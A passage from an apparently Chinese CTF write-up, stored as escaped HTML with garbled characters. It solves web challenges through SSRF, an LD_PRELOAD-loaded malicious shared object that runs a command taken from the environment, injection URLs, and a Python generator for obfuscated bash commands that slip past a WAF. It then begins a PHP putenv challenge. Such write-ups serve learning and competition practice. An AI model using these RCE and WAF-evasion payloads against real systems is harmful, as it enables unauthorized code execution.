&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Marshal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">UploadFileResult&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">Code&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#75af00">fileName&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Marshal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">UploadFileResult&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">Code&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;ERROR TOKEN&amp;#34;&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">checkToken&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">bool&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">has&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sum&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">md5str&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%x&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">has&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">md5str&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">token&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">IndexHandler&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ServeFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dist/index.html&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;secret/key&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// è¯»secret/key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">panic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">defer&lt;/span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">ioutil&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ReadAll&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">IndexHandler&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">FileServer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Dir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;dist/static&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Handle&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/static/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">StripPrefix&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/static/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/token&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">getToken&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/upload&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">uploadFile&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/list&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">listFile&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start listen 9090&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:9090&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ListenAndServe: &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦SSRFè®¿é—®9091ç«¯å£çš„/manage å¹¶ä¸”ç»•wafè¿›è¡Œå‘½ä»¤æ³¨å…¥è¯»flag&lt;/p>
&lt;p>æ³¨æ„åˆ°webæœåŠ¡çš„/tokenè·¯ç”±å¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬è‡ªç„¶æƒ³åˆ°åˆ©ç”¨LD_PRELOADå’Œæ¶æ„.soæ¥åŠ«æŒç³»ç»Ÿå‡½æ•°è¿›è¡Œrce&lt;/p>
&lt;p>ä¼ æ–‡ä»¶ï¼Œé€šè¿‡webçš„&lt;code>/token?http_proxy=http://127.0.0.1:8080&lt;/code>å¯ä»¥è·å¾—å½“å‰tokenï¼ˆå³ä¸Šä¼ ç›®å½•&lt;/p>
&lt;p>ä¹‹åä¸Šä¼ æ¶æ„.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span>&lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">__attribute__&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">constructor&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">l3yx&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">unsetenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_evilcmd&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -fPIC e.c -o e.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨&lt;code>/token?LD_PRELOAD=/code/uploads/{token}&amp;amp;_evilcmd=ls%20-l%20/&amp;amp;http_proxy=127.0.0.1:8080&lt;/code>ä¸‹è¿›è¡Œæ³¨å…¥ï¼ŒæˆåŠŸrce&lt;/p>
&lt;p>ä¹‹åå¼¹ä¸ªshell&lt;/p>
&lt;p>æœ€åï¼Œå¯¹äºwafï¼Œç”¨è¿™ä¸ªï¼ˆä¹‹å‰ä¹Ÿè§è¿‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;0&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;${##}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$((${##}&amp;lt;&amp;lt;${##}))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$(($((${##}&amp;lt;&amp;lt;${##}))#${##}${##}))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$((${##}&amp;lt;&amp;lt;$((${##}&amp;lt;&amp;lt;${##}))))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$(($((${##}&amp;lt;&amp;lt;${##}))#${##}0${##}))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$(($((${##}&amp;lt;&amp;lt;${##}))#${##}${##}0))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;$(($((${##}&amp;lt;&amp;lt;${##}))#${##}${##}${##}))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">str_to_oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#111">))))[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">o&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">s&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;$0&amp;lt;&amp;lt;&amp;lt;$0\&amp;lt;\&amp;lt;\&amp;lt;\$&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str_to_oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:]:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\\\&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;cat /flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>curl &amp;quot;http://localhost:9091/manage?m=%3b{urlencode(payload)}&amp;quot;&lt;/code>&lt;/p>
&lt;h3 id="è™ç¬¦ctf-2022ezphp">[è™ç¬¦CTF 2022]ezphp&lt;/h3>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s?__biz=Mzg2MjYxMjAzMg==&amp;amp;mid=2247483903&amp;amp;idx=1&amp;amp;sn=26b6af39bc1bf9a0055c0be38a666472&amp;amp;chksm=ce047ed0f973f7c6b7a2ee4a300d10d22cf2a6e38fcbe5190011c8f08b14da9a30db2bf11061&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=0321x9PydhpbLJpuag0EBm4W&amp;amp;sharer_sharetime=1647861577180&amp;amp;sharer_shareid=3679f20229d72930158c21ee7f573b1e#rd">wp&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;env&amp;#34;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">putenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;env&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;echo hfctf2022&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>oneline phpï¼Œçœ‹åˆ°è¿™ä¸ªputenvå†ç»“åˆå‰é¢çš„æ —å­åº”è¯¥ä¸é™Œç”Ÿäº†å°±ï¼Œç»“åˆNginxä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ ä¼ .so&lt;/p>
